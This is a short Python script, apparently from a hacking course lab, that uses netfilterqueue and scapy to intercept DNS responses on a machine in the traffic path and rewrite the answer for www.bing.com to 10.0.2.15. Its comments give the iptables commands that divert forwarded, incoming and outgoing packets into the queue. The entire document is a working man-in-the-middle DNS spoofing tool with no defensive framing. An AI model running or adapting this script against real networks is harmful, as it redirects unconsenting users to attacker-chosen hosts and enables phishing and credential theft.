#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

#iptables -I FORWARD -j NFQUEUE --queue-num 0
#this is the place where packets are included by default as they flow through the computer

#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#this will capture all the outgoing packets of the current machine

#iptables -I INPUT -j NFQUEUE --queue-num 0
#this will capture all the incoming packets of the current machine

#iptables --flush
#clear out IP tables

#DNSQR - DNS Question Record
#DNSRR - DNS Resource Record

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
        #print(scapy_packet.show())
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()